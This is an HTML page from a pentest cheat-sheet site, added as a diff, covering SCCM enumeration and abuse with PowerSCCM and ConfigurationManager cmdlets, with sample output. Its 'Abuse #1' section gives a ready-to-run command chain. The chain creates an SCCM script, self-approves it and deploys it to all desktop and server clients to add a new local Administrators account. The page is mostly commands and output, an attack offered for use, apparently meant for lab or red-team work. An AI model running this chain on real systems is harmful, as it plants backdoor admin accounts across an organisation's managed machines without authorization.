@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>SCCM | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/sccm/">
+      <span>SCCM</span>
+    </a>
+  </h1>
+  <div class="js-toggle-wrapper">
+    <div class="js-toggle">
+        <div class="js-toggle-track">
+            <div class="js-toggle-track-check">
+                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+            </div>
+            <div class="js-toggle-track-x">
+                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+            </div>
+        </div>
+        <div class="js-toggle-thumb"></div>
+        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+    </div>
+</div>
+    
+<style>
+ 
+
+ 
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
+
+.js-toggle-wrapper {
+    display: table;
+    float: right;
+    margin-left: auto;
+}
+
+.js-toggle {
+    touch-action: pan-x;
+    display: inline-block;
+    position: relative;
+    cursor: pointer;
+    background-color: transparent;
+    user-select: none;
+}
+
+.js-toggle-screenreader-only {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
+    width: 50px;
+    height: 24px;
+    border-radius: 30px;
+    background-color: hsl(223, 61%, 44%);
+    transition: background-color 0.2s ease;
+}
+
+.js-toggle-track-check,
+.js-toggle-track-x {
+    position: absolute;
+    width: 17px;
+    height: 17px;
+    top: 50%;
+    transform: translateY(-50%);
+    transition: opacity 0.25s ease;
+}
+
+.js-toggle-track-check {
+    left: 5px;
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
+    position: absolute;
+    top: 1px;
+    left: 1px;
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background-color: #fafafa;
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
+    transform: translateX(26px);
+}
+</style>
+
+<script>
+    var body = document.body;
+    var switcher = document.getElementsByClassName('js-toggle')[0];
+
+    
+    switcher.addEventListener("click", function() {
+        this.classList.toggle('js-toggle--checked');
+        
+        if (this.classList.contains('js-toggle--checked')) {
+            body.classList.add('dark-mode');
+            
+            localStorage.setItem('darkMode', 'true');
+        } else {
+            body.classList.remove('dark-mode');
+            setTimeout(function() {
+                localStorage.removeItem('darkMode');
+            }, 100);
+        }
+    })
+
+    
+    if (localStorage.getItem('darkMode')) {
+        
+        switcher.classList.add('js-toggle--checked');
+        body.classList.add('dark-mode');
+    }
+</script>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@sccm/">SCCM</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@system-center-configuration-manager/">System Center Configuration Manager</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@configuration-management/">Configuration Management</a></li>
+  
+</ul>
+<hr>
+<div class="content">
+  <div id="dynamicFormContainer">
+	<form id="dynamicForm" style="display: none;">
+	</form>
+	<div class="buttons center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
+
+<style>
+#dynamicFormContainer {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 0;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#dynamicFormContainer * {
+    box-sizing: border-box;
+}
+
+#dynamicFormContainer input {
+  border-radius: 0.2em;
+  margin-bottom: 15px;
+}
+
+#dynamicFormContainer input:focus {
+  outline: 0.1em solid var(--secondary);
+}
+
+#dynamicFormContainer input[type=text] {
+  width: 100%;
+  border-radius: 0.2em;
+  border: 0.1em solid var(--secondary);
+  padding: 0.4rem;
+  font-size: 0.9rem;
+}
+
+#dynamicFormContainer label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#dynamicFormContainer button {
+	display: inline-block;
+	margin: 20px auto;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+	grid-column: 1 / span 2;
+    justify-self: center;
+}
+
+#dynamicFormContainer button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+#dynamicForm {
+    grid-template-columns: 1fr 1fr;
+    column-gap: 20px;
+    row-gap: 0px;
+    margin: 0 auto;
+    padding: 30px 20px 0;
+}
+
+.input-group {
+    display: flex;
+    flex-direction: column;
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #dynamicFormContainer {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 0;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #dynamicFormContainer * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #dynamicFormContainer input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #dynamicFormContainer input:focus {
+	outline: 0.1em solid #616161;
+}
+
+body.dark-mode #dynamicFormContainer input[type=text] {
+  width: 100%;
+  border-radius: 0.2em;
+  border: 0.1em solid #616161;
+  padding: 0.4rem;
+  font-size: 0.9rem;
+  background-color: #bdbdbd;
+}
+
+body.dark-mode #dynamicFormContainer label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #dynamicFormContainer button {
+	display: inline-block;
+	margin: 20px auto;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+	grid-column: 1 / span 2;
+    justify-self: center;
+}
+
+body.dark-mode #dynamicFormContainer button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+</style>
+  <h3 id="enum">Enum</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-module">1. Import Module</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerSCCM.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; . .\PowerSCCM.ps1
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/PowerShellMafia/PowerSCCM">PowerSCCM.ps1</a></em></small></p>
+<h4 id="2-find-sccmsitecode">2. Find SccmSiteCode</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Find-SccmSiteCode -ComputerName &lt;TARGET_COMPUTER&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Find-SccmSiteCode -ComputerName sccm.example.local   
+</span></span></span><span class="line"><span class="cl"><span class="go">Find-SccmSiteCode -ComputerName sccm.example.local
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SiteCode
+</span></span></span><span class="line"><span class="cl"><span class="go">--------
+</span></span></span><span class="line"><span class="cl"><span class="go">GH1
+</span></span></span></code></pre></div><h4 id="3-new-sccmsession">3. New SccmSession</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-SccmSession -ComputerName &lt;TARGET_COMPUTER&gt; -SiteCode &lt;SITE_CODE&gt; -ConnectionType wmi
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; New-SccmSession -ComputerName SCCM -SiteCode GH1 -ConnectionType wmi
+</span></span></span><span class="line"><span class="cl"><span class="go">New-SccmSession -ComputerName SCCM -SiteCode GH1 -ConnectionType wmi
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Id             : 1
+</span></span></span><span class="line"><span class="cl"><span class="go">Name           : GH11
+</span></span></span><span class="line"><span class="cl"><span class="go">ComputerName   : SCCM
+</span></span></span><span class="line"><span class="cl"><span class="go">Credential     : 
+</span></span></span><span class="line"><span class="cl"><span class="go">SiteCode       : GH1
+</span></span></span><span class="line"><span class="cl"><span class="go">ConnectionType : wmi
+</span></span></span><span class="line"><span class="cl"><span class="go">SccmVersion    : 5
+</span></span></span><span class="line"><span class="cl"><span class="go">Permissions    : {ALL}
+</span></span></span><span class="line"><span class="cl"><span class="go">Provider       : \\SCCM\ROOT\sms:SMS_ProviderLocation.Machine=&#34;sccm.Example.local&#34;,SiteCode=&#34;GH1&#34;
+</span></span></span></code></pre></div><h4 id="4-check-sccmsessions">4. Check SccmSessions</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-SCCMSession | Get-SCCMComputer
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-SCCMSession | Get-SCCMComputer
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-SCCMSession | Get-SCCMComputer
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name                : SRV002
+</span></span></span><span class="line"><span class="cl"><span class="go">FullDomainName      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">IPAddresses         : {192.168.22.16}
+</span></span></span><span class="line"><span class="cl"><span class="go">LastLogonUserDomain : 
+</span></span></span><span class="line"><span class="cl"><span class="go">LastLogonUserName   : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name                : SCCM
+</span></span></span><span class="line"><span class="cl"><span class="go">FullDomainName      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">IPAddresses         : {192.168.21.155}
+</span></span></span><span class="line"><span class="cl"><span class="go">LastLogonUserDomain : 
+</span></span></span><span class="line"><span class="cl"><span class="go">LastLogonUserName   : 
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-SCCMSession | Get-SCCMCollection
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-SCCMSession | Get-SCCMCollection
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-SCCMSession | Get-SCCMCollection
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">__GENUS                        : 2
+</span></span></span><span class="line"><span class="cl"><span class="go">__CLASS                        : SMS_Collection
+</span></span></span><span class="line"><span class="cl"><span class="go">__SUPERCLASS                   : SMS_BaseClass
+</span></span></span><span class="line"><span class="cl"><span class="go">__DYNASTY                      : SMS_BaseClass
+</span></span></span><span class="line"><span class="cl"><span class="go">__RELPATH                      : SMS_Collection.CollectionID=&#34;SMS00001&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">__PROPERTY_COUNT               : 31
+</span></span></span><span class="line"><span class="cl"><span class="go">__DERIVATION                   : {SMS_BaseClass}
+</span></span></span><span class="line"><span class="cl"><span class="go">__SERVER                       : SCCM
+</span></span></span><span class="line"><span class="cl"><span class="go">__NAMESPACE                    : root\sms\site_GH1
+</span></span></span><span class="line"><span class="cl"><span class="go">__PATH                         : \\SCCM\root\sms\site_GH1:SMS_Collection.CollectionID=&#34;SMS00001&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">CollectionID                   : SMS00001
+</span></span></span><span class="line"><span class="cl"><span class="go">CollectionRules                : 
+</span></span></span><span class="line"><span class="cl"><span class="go">CollectionType                 : 2
+</span></span></span><span class="line"><span class="cl"><span class="go">CollectionVariablesCount       : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">Comment                        : All Systems
+</span></span></span><span class="line"><span class="cl"><span class="go">CurrentStatus                  : 1
+</span></span></span><span class="line"><span class="cl"><span class="go">HasProvisionedMember           : True
+</span></span></span><span class="line"><span class="cl"><span class="go">IncludeExcludeCollectionsCount : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">IsBuiltIn                      : True
+</span></span></span><span class="line"><span class="cl"><span class="go">IsReferenceCollection          : True
+</span></span></span><span class="line"><span class="cl"><span class="go">ISVData                        : 
+</span></span></span><span class="line"><span class="cl"><span class="go">ISVDataSize                    : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">ISVString                      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">LastChangeTime                 : 20200106084829.590000+***
+</span></span></span><span class="line"><span class="cl"><span class="go">LastMemberChangeTime           : 20241123103441.073000+***
+</span></span></span><span class="line"><span class="cl"><span class="go">LastRefreshTime                : 20241123120046.397000+***
+</span></span></span><span class="line"><span class="cl"><span class="go">LimitToCollectionID            : 
+</span></span></span><span class="line"><span class="cl"><span class="go">LimitToCollectionName          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">LocalMemberCount               : 4
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberClassName                : SMS_CM_RES_COLL_SMS00001
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberCount                    : 4
+</span></span></span><span class="line"><span class="cl"><span class="go">MonitoringFlags                : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">Name                           : All Systems
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectPath                     : /
+</span></span></span><span class="line"><span class="cl"><span class="go">OwnedByThisSite                : True
+</span></span></span><span class="line"><span class="cl"><span class="go">PowerConfigsCount              : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">RefreshSchedule                : 
+</span></span></span><span class="line"><span class="cl"><span class="go">RefreshType                    : 6
+</span></span></span><span class="line"><span class="cl"><span class="go">ReplicateToSubSites            : True
+</span></span></span><span class="line"><span class="cl"><span class="go">ServiceWindowsCount            : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">UseCluster                     : 
+</span></span></span><span class="line"><span class="cl"><span class="go">PSComputerName                 : SCCM
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span></code></pre></div></div></p>
+<hr>
+<h3 id="abuse-1-add-custom-script">Abuse #1: Add Custom Script</h3>
+<h4 id="1-import-module">1. Import Module</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd &#39;C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Import-Module .\ConfigurationManager.psd1
+</span></span></span></code></pre></div><h4 id="2-check">2. Check</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-CMsite
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS GH1:\&gt; Get-CMsite
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-CMsite
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SmsProviderObjectPath       : SMS_Site.SiteCode=&#34;GH1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">BuildNumber                 : 8790
+</span></span></span><span class="line"><span class="cl"><span class="go">ContentLibraryLocation      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">ContentLibraryMoveProgress  : 100
+</span></span></span><span class="line"><span class="cl"><span class="go">ContentLibraryStatus        : 3
+</span></span></span><span class="line"><span class="cl"><span class="go">Features                    : 0000000000000000000000000000000000000000000000000000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="go">InstallDir                  : C:\Program Files\Microsoft Configuration Manager
+</span></span></span><span class="line"><span class="cl"><span class="go">Mode                        : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">ReportingSiteCode           : 
+</span></span></span><span class="line"><span class="cl"><span class="go">RequestedStatus             : 110
+</span></span></span><span class="line"><span class="cl"><span class="go">SecondarySiteCMUpdateStatus : 2
+</span></span></span><span class="line"><span class="cl"><span class="go">ServerName                  : sccm.Example.local
+</span></span></span><span class="line"><span class="cl"><span class="go">SiteCode                    : GH1
+</span></span></span><span class="line"><span class="cl"><span class="go">SiteName                    : Example
+</span></span></span><span class="line"><span class="cl"><span class="go">Status                      : 1
+</span></span></span><span class="line"><span class="cl"><span class="go">TimeZoneInfo                : 000001E0 0000 000B 0000 0001 0002 0000 0000 0000 00000000 0000 0003 0000 0002 0002 0000 
+</span></span></span><span class="line"><span class="cl"><span class="go">                              0000 0000 FFFFFFC4
+</span></span></span><span class="line"><span class="cl"><span class="go">Type                        : 2
+</span></span></span><span class="line"><span class="cl"><span class="go">Version                     : 5.00.8790.1000
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-CMManagementPoint
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS GH1:\&gt; Get-CMManagementPoint
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-CMManagementPoint
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SmsProviderObjectPath : SMS_SCI_SysResUse.FileType=2,ItemName=&#34;[\&#34;Display=\\\\sccm.Example.local\\\&#34;]MSWNET:[\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">                        SMS_SITE=GH1\&#34;]\\\\sccm.Example.local\\,SMS Management Point&#34;,ItemType=&#34;System 
+</span></span></span><span class="line"><span class="cl"><span class="go">                        Resource Usage&#34;,SiteCode=&#34;GH1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">FileType              : 2
+</span></span></span><span class="line"><span class="cl"><span class="go">ItemName              : [&#34;Display=\\sccm.Example.local\&#34;]MSWNET:[&#34;SMS_SITE=GH1&#34;]\\sccm.Example.local\,S
+</span></span></span><span class="line"><span class="cl"><span class="go">                        MS Management Point
+</span></span></span><span class="line"><span class="cl"><span class="go">ItemType              : System Resource Usage
+</span></span></span><span class="line"><span class="cl"><span class="go">NALPath               : [&#34;Display=\\sccm.Example.local\&#34;]MSWNET:[&#34;SMS_SITE=GH1&#34;]\\sccm.Example.local\
+</span></span></span><span class="line"><span class="cl"><span class="go">NALType               : Windows NT Server
+</span></span></span><span class="line"><span class="cl"><span class="go">NetworkOSPath         : \\sccm.Example.local
+</span></span></span><span class="line"><span class="cl"><span class="go">PropLists             : {Objects Polled By Site Status}
+</span></span></span><span class="line"><span class="cl"><span class="go">Props                 : {Authentication type, ClientShare, DatabaseName, MPDefault...}
+</span></span></span><span class="line"><span class="cl"><span class="go">RoleCount             : 8
+</span></span></span><span class="line"><span class="cl"><span class="go">RoleName              : SMS Management Point
+</span></span></span><span class="line"><span class="cl"><span class="go">ServerState           : 196611
+</span></span></span><span class="line"><span class="cl"><span class="go">ServiceWindows        : 
+</span></span></span><span class="line"><span class="cl"><span class="go">SiteCode              : GH1
+</span></span></span><span class="line"><span class="cl"><span class="go">SiteSystemStatus      : 1
+</span></span></span><span class="line"><span class="cl"><span class="go">SslState              : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">Type                  : 2
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-CMActiveDirectoryForest
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS GH1:\&gt; Get-CMActiveDirectoryForest
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-CMActiveDirectoryForest
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SmsProviderObjectPath : SMS_ADForest.ForestID=16777217
+</span></span></span><span class="line"><span class="cl"><span class="go">Account               : 
+</span></span></span><span class="line"><span class="cl"><span class="go">CreatedBy             : Example\Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">CreatedOn             : 1/6/2020 5:23:56 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">Description           : Example.local
+</span></span></span><span class="line"><span class="cl"><span class="go">DiscoveredADSites     : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">DiscoveredDomains     : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">DiscoveredIPSubnets   : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">DiscoveredTrusts      : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">DiscoveryStatus       : 
+</span></span></span><span class="line"><span class="cl"><span class="go">EnableDiscovery       : True
+</span></span></span><span class="line"><span class="cl"><span class="go">ForestFQDN            : Example.local
+</span></span></span><span class="line"><span class="cl"><span class="go">ForestID              : 16777217
+</span></span></span><span class="line"><span class="cl"><span class="go">ModifiedBy            : Example\Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">ModifiedOn            : 1/6/2020 5:23:56 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">PublishingPath        : 
+</span></span></span><span class="line"><span class="cl"><span class="go">PublishingStatus      : 1
+</span></span></span></code></pre></div><h4 id="2-add-new-user-to-administrators-group">2. Add New User to Administrators Group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd &lt;SITE_CODE&gt;:
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd GH1:
+</span></span></span><span class="line"><span class="cl"><span class="go">PS GH1:\&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-CMScript -ScriptName test -Fast -ScriptText &#34;net user &lt;USER&gt; &lt;PASSWORD&gt; /add; net localgroup Administrators &lt;USER&gt; /add&#34;; Get-CMScript -Fast -ScriptName test | Approve-CMScript; Get-CMScript -Fast -ScriptName test | Invoke-CMScript -CollectionName &#39;All Desktop and Server Clients&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS GH1:\&gt; New-CMScript -ScriptName test -Fast -ScriptText &#34;net user test_user Test1234 /add; net localgroup Administrators test_user /add&#34;; Get-CMScript -Fast -ScriptName test | Approve-CMScript; Get-CMScript -Fast -ScriptName test | Invoke-CMScript -CollectionName &#39;All Desktop and Server Clients&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">New-CMScript -ScriptName test -Fast -ScriptText &#34;net user test_user Test1234 /add; net localgroup Administrators test_user /add&#34;; Get-CMScript -Fast -ScriptName test | Approve-CMScript; Get-CMScript -Fast -ScriptName test | Invoke-CMScript -CollectionName &#39;All Desktop and Server Clients&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SmsProviderObjectPath : SMS_Scripts.ScriptGuid=&#34;AAA8C83C-3DE4-4BD5-96B2-55F801139763&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">ApprovalState         : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">Approver              : 
+</span></span></span><span class="line"><span class="cl"><span class="go">Author                : NT AUTHORITY\SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go">Comment               : 
+</span></span></span><span class="line"><span class="cl"><span class="go">Feature               : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">LastUpdateTime        : 11/23/2024 5:58:16 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">ParameterGroupHash    : 
+</span></span></span><span class="line"><span class="cl"><span class="go">Parameterlist         : 
+</span></span></span><span class="line"><span class="cl"><span class="go">ParameterlistXML      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">ParamsDefinition      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">Script                : 
+</span></span></span><span class="line"><span class="cl"><span class="go">ScriptGuid            : AAA8C83C-3DE4-4BD5-96B2-55F801139763
+</span></span></span><span class="line"><span class="cl"><span class="go">ScriptHash            : 6F6994FCAEDE9916FF682A0D7BB70A17F9DFC99CD3223704D4E650860640F5D8
+</span></span></span><span class="line"><span class="cl"><span class="go">ScriptHashAlgorithm   : SHA256
+</span></span></span><span class="line"><span class="cl"><span class="go">ScriptName            : test
+</span></span></span><span class="line"><span class="cl"><span class="go">ScriptType            : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">ScriptVersion         : 1
+</span></span></span></code></pre></div>
+</div></div>
+    
+    <script type="module" src="/js/main.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+    </div>
+</footer>
+</body>
+</html>
